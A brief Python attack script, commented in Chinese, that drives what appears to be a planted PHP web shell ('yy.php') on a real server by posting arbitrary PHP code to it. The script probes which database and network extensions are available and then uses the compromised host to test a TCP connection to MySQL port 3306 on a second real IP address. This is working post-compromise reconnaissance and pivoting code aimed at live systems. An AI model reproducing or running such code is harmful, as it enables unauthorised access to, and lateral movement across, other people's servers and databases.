#!/usr/bin/env python3
"""诊断81.70 PHP扩展 + 连124.71"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=40):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

tests = [
    ("扩展检测", "print_r('mysqli:' . (function_exists('mysqli_connect')?'Y':'N') . '|pdo:' . (class_exists('PDO')?'Y':'N') . '|curl:' . (function_exists('curl_init')?'Y':'N'));"),
    ("socket检测", "print_r('sock:' . (function_exists('fsockopen')?'Y':'N'));"),
    ("fsockopen连124:3306", "print_r(fsockopen('124.71.142.158',3306,$e,$es,5)?'TCP_OK':'TCP_FAIL:'.$es);"),
]
for name, code in tests:
    r = cmd(code)
    print(f"--- {name} ---")
    print("  out:", repr(r.strip()[-150:]))
